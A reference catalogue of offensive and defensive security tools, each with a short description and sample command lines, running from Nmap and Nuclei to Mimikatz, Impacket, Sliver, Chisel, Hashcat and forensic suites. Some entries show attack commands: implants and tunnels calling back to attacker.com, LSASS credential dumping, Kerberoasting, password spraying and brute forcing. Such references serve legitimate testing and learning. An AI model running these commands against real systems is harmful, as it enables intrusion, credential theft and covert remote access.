name: Nmap
description: Network discovery and port scanner with service/version detection and the NSE scripting engine.
usage:
nmap -sV -sC -p- 10.0.0.1
nmap -sU --top-ports 50 10.0.0.1
nmap --script vuln 10.0.0.1

name: Masscan
description: Asynchronous port scanner designed for very fast internet-scale sweeps.

name: Naabu
description: Fast SYN/CONNECT port scanner from ProjectDiscovery with host discovery support.
usage:
naabu -host target.com -top-ports 1000
naabu -list hosts.txt -p - -silent

name: Amass
description: Attack-surface mapping and subdomain enumeration using passive and active sources.
usage:
amass enum -d example.com
amass enum -active -d example.com -brute

name: Subfinder
description: Passive subdomain discovery that aggregates data from public sources.
usage:
subfinder -d example.com -silent
subfinder -dL domains.txt -all -o subs.txt

name: dnsx
description: DNS toolkit for bulk resolution, wildcard filtering, and record queries.
usage:
subfinder -d example.com -silent | dnsx -a -resp
cat subs.txt | dnsx -cname -mx

name: httpx
description: HTTP toolkit for probing hosts, collecting titles, status codes, technologies, and screenshots.
usage:
cat hosts.txt | httpx -title -status-code -tech-detect
httpx -u https://target.com -path /admin -mc 200

name: Nuclei
description: Template-driven vulnerability scanner with a large community template ecosystem.
usage:
nuclei -u https://target.com -severity critical,high
nuclei -l urls.txt -tags cve -o findings.txt

name: ffuf
description: Fast web fuzzer for content discovery, parameter fuzzing, and virtual host enumeration.
usage:
ffuf -u https://target.com/FUZZ -w wordlist.txt
ffuf -u https://target.com -H 'Host: FUZZ.target.com' -w vhosts.txt

name: feroxbuster
description: Recursive content discovery tool written in Rust with filtering and rate limiting.
usage:
feroxbuster -u https://target.com -w wordlist.txt
feroxbuster -u https://target.com --extensions php,html -d 2

name: Gobuster
description: Enumeration tool for directories, DNS names, virtual hosts, and cloud buckets.
usage:
gobuster dir -u https://target.com -w wordlist.txt
gobuster dns -d example.com -w subdomains.txt

name: Katana
description: Next-generation web crawler that extracts endpoints, forms, and JavaScript links.
usage:
katana -u https://target.com -jc -d 3
katana -list urls.txt -aff -o endpoints.txt

name: theHarvester
description: OSINT collector for emails, hostnames, subdomains, and employee names from public sources.
usage: theHarvester -d example.com -b all -l 500

name: Recon-ng
description: Modular reconnaissance framework with workspaces and database-backed modules.
usage:
recon-ng
> workspaces create engagement
> modules load recon/domains-hosts/hackertarget
> run

name: SpiderFoot
description: OSINT automation platform that correlates data across hundreds of modules.
usage:
spiderfoot -l 127.0.0.1:5001
spiderfoot -s example.com -t IP_ADDRESS,DOMAIN_NAME -o csv

name: Sherlock
description: Username enumeration across social networks and public sites.
usage:
sherlock username
sherlock username --timeout 5 --csv

name: ExifTool
description: Metadata reader and writer for images, documents, and media files.
usage:
exiftool image.jpg
exiftool -a -G1 -s document.pdf

name: Burp Suite
description: Web security testing platform with an intercepting proxy, scanner, and extensible tooling.
usage: Start the proxy listener on 127.0.0.1:8080, then configure the browser to use it.

name: OWASP ZAP
description: Open-source web application proxy and scanner for manual and automated testing.
usage:
zap.sh -daemon -host 127.0.0.1 -port 8080
zap-cli quick-scan --self-contained https://target.com

name: sqlmap
description: Automatic SQL injection detection and exploitation tool with database takeover features.
usage:
sqlmap -u 'https://target.com/item?id=1' --batch
sqlmap -r request.txt -p id --dbs

name: Dalfox
description: XSS scanner and parameter analysis tool focused on fast, reliable findings.
usage:
dalfox url https://target.com/?q=test
dalfox file urls.txt --blind your.xss.ht

name: Commix
description: Automated command injection exploitation tool for web applications.
usage: commix -u 'https://target.com/ping?ip=127.0.0.1' --batch

name: Nikto
description: Web server scanner that checks for dangerous files, outdated software, and misconfigurations.
usage:
nikto -h https://target.com
nikto -h target.com -ssl -Tuning 123

name: WPScan
description: WordPress security scanner for plugins, themes, users, and known vulnerabilities.
usage:
wpscan --url https://target.com --enumerate vp,vt,u
wpscan --url https://target.com --api-token TOKEN

name: jwt_tool
description: JWT testing toolkit for decoding, tampering, and testing signature weaknesses.
usage:
python3 jwt_tool.py eyJ... -T
python3 jwt_tool.py eyJ... -M at -t 'https://target.com/api'

name: BloodHound
description: Active Directory attack-path analysis using graph queries over collected relationship data.
usage: Start BloodHound, import a SharpHound/HoundCE zip, then run built-in queries.

name: SharpHound
description: Active Directory data collector that produces BloodHound-compatible relationship data.
usage:
SharpHound.exe -c All --zipfilename collection.zip
SharpHound.exe -c ACL,Trusts,Group

name: Impacket
description: Python toolkit for Windows network protocols, including SMB, WMI, Kerberos, and NTLM attacks.
usage:
impacket-secretsdump domain/user:pass@10.0.0.10
impacket-psexec domain/user:pass@10.0.0.10
impacket-GetUserSPNs domain/user:pass -dc-ip 10.0.0.10 -request

name: Rubeus
description: C# toolkit for Kerberos interaction, ticket abuse, and credential extraction on Windows.
usage:
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe asreproast /format:hashcat

name: Certipy
description: Active Directory Certificate Services enumeration and exploitation toolkit.
usage:
certipy find -u user@domain.local -p pass -dc-ip 10.0.0.10 -vulnerable
certipy req -u user@domain.local -p pass -ca CA -template Template

name: PowerView
description: PowerShell reconnaissance module for enumerating Active Directory objects and permissions.
usage:
Import-Module .\PowerView.ps1
Get-DomainUser | select samaccountname,description
Find-InterestingDomainAcl

name: Mimikatz
description: Windows credential extraction toolkit for LSASS secrets, tickets, and authentication material.
usage:
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

name: NetExec
description: Network service exploitation and enumeration framework for SMB, WinRM, LDAP, MSSQL, and more.
usage:
nxc smb 10.0.0.0/24 -u user -p pass
nxc ldap dc.domain.local -u user -p pass --users
nxc winrm 10.0.0.10 -u user -H NThash

name: Responder
description: LLMNR, NBT-NS, and mDNS poisoner used to capture NetNTLM challenge responses.
usage:
responder -I eth0 -wrf
responder -I eth0 -A

name: Kerbrute
description: Kerberos pre-authentication brute-force and user enumeration tool.
usage:
kerbrute userenum --dc 10.0.0.10 -d domain.local users.txt
kerbrute passwordspray --dc 10.0.0.10 -d domain.local users.txt 'Spring2026!'

name: Metasploit Framework
description: Exploitation framework with modules, payloads, encoders, and post-exploitation tooling.
usage:
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.0.0/24
run

name: Sliver
description: Open-source command-and-control framework with implants for multiple platforms.
usage:
sliver-server
sliver > generate --mtls attacker.com --os windows
sliver > mtls --lport 8888

name: Havoc
description: Modern command-and-control framework with a modular agent and teamserver.
usage: Start the teamserver, launch the Havoc client, then create an HTTP listener and generate a Demon agent.

name: BeEF
description: Browser exploitation framework for hooking browsers and testing client-side attack surfaces.
usage:
beef-xss
Open the admin UI at http://127.0.0.1:3000/ui/panel

name: SearchSploit
description: Command-line interface to Exploit-DB for locating public exploits and shellcode.
usage:
searchsploit apache 2.4
searchsploit -m 50383

name: Chisel
description: TCP/UDP tunnel over HTTP with a client-server model for pivoting through restricted networks.
usage:
chisel server -p 8080 --reverse
chisel client attacker.com:8080 R:socks

name: Ligolo-ng
description: Agent-based tunneling and pivoting tool with a TUN interface and per-session routing.
usage:
sudo ip tuntap add user $(whoami) mode tun ligolo
ligolo-proxy -selfcert
agent -connect attacker.com:11601 -ignore-cert

name: Bettercap
description: Swiss-army knife for network reconnaissance and man-in-the-middle attacks.
usage:
bettercap -iface eth0
net.probe on
net.sniff on

name: Wireshark
description: Packet capture and protocol analysis GUI with deep dissection support.
usage:
wireshark
Filter examples: ip.addr == 10.0.0.1 && tcp.port == 80

name: Hashcat
description: GPU-accelerated password recovery tool supporting hundreds of hash and cipher types.
usage:
hashcat -m 1000 hashes.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule

name: John the Ripper
description: Password cracking suite with automatic hash detection and many format-specific modes.
usage:
john --wordlist=rockyou.txt hashes.txt
john --format=NT hashes.txt --show

name: Hydra
description: Parallelized login brute-forcer supporting many network protocols and services.
usage:
hydra -l admin -P passwords.txt ssh://10.0.0.10
hydra -L users.txt -P passwords.txt 10.0.0.10 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'

name: Medusa
description: Speedy, modular login brute-forcer for a wide range of services.
usage:
medusa -h 10.0.0.10 -u admin -P passwords.txt -M ssh
medusa -h 10.0.0.10 -U users.txt -P passwords.txt -M ftp

name: Volatility 3
description: Memory forensics framework for analyzing RAM captures across Windows, Linux, and macOS.
usage:
vol -f memory.raw windows.pslist
vol -f memory.raw windows.netscan
vol -f memory.raw windows.malfind

name: Autopsy
description: Digital forensics platform for disk image analysis, timelines, and artifact extraction.
usage: Create a case, add the disk image as a data source, then run ingest modules.

name: The Sleuth Kit
description: Command-line filesystem forensic tools for disk images and file recovery.
usage:
mmls disk.img
fls -r -p -o 2048 disk.img
icat -o 2048 disk.img 12345 > recovered.bin

name: Chainsaw
description: Rapid Windows event log and forensic artifact hunting with Sigma rule support.
usage:
chainsaw hunt evtx/ --sigma sigma/ --mapping mappings/sigma-event-logs-all.yml
chainsaw dump evtx/Security.evtx

name: Hayabusa
description: Windows event log threat-hunting and timeline generator built on Sigma rules.
usage:
hayabusa csv-timeline -d evtx/ -o timeline.csv
hayabusa logon-summary -d evtx/

name: Velociraptor
description: Endpoint visibility and DFIR platform for live hunting, collection, and monitoring at scale.
usage:
velociraptor.exe --config server.config.yaml frontend
Deploy agents, then run artifact collections from the GUI.

name: Zeek
description: Network security monitor that produces structured logs for traffic analysis and hunting.
usage:
zeek -i eth0 local
zeek-cut id.orig_h id.resp_h method uri < http.log

name: Ghidra
description: NSA-developed software reverse engineering suite with decompiler and scripting support.
usage: Launch Ghidra, create a project, import the binary, and run Auto Analyze.

name: IDA Free
description: Free edition of the IDA disassembler and debugger for non-commercial reverse engineering.
usage: Open the binary, let auto-analysis finish, then inspect functions and cross-references.

name: radare2
description: Command-line reverse engineering framework with disassembly, debugging, and binary patching.
usage:
r2 -A binary
[0x00000000]> afl
[0x00000000]> pdf @ main

name: x64dbg
description: Open-source Windows debugger for user-mode binaries with scripting and plugin support.
usage: Open the executable, set breakpoints on API calls, and step through execution.

name: PEStudio
description: Static analysis tool for Windows PE files covering imports, resources, strings, and indicators.
usage: Drag the sample into PEStudio and review the indicators, imports, and strings tabs.

name: capa
description: Capability detection tool that maps executable behavior to ATT&CK and malware techniques.
usage:
capa suspicious.exe
capa -v suspicious.exe -j > capabilities.json

name: FLOSS
description: String extraction and deobfuscation tool for malware, including decoded stack strings.
usage:
floss suspicious.exe
floss -n 8 suspicious.exe

name: Pacu
description: AWS exploitation framework with modules for enumeration, privilege escalation, and persistence.
usage:
pacu
Pacu > import_keys profile
Pacu > run iam__enum_permissions

name: ScoutSuite
description: Multi-cloud security auditing tool that produces an interactive findings report.
usage:
scout aws --profile default
scout azure --cli

name: Prowler
description: Cloud security assessment tool with hundreds of checks across AWS, Azure, GCP, and Kubernetes.
usage:
prowler aws
prowler azure --az-cli-auth
prowler kubernetes --kubeconfig-file config

name: Trivy
description: Scanner for container images, filesystems, repositories, and Kubernetes misconfigurations.
usage:
trivy image nginx:latest
trivy fs .
trivy k8s --report summary cluster

name: Frida
description: Dynamic instrumentation toolkit for injecting scripts into running processes on desktop and mobile.
usage:
frida-ps -U
frida -U -f com.example.app -l hook.js --no-pause

name: Objection
description: Runtime mobile exploration toolkit built on Frida for Android and iOS assessments.
usage:
objection -g com.example.app explore
android root disable
ios sslpinning disable

name: MobSF
description: Mobile application security framework for static and dynamic analysis of Android and iOS apps.
usage:
mobsf
Open http://127.0.0.1:8000 and upload the APK/IPA.

name: jadx
description: Dex-to-Java decompiler with a GUI and CLI for Android application analysis.
usage:
jadx-gui app.apk
jadx -d out app.apk
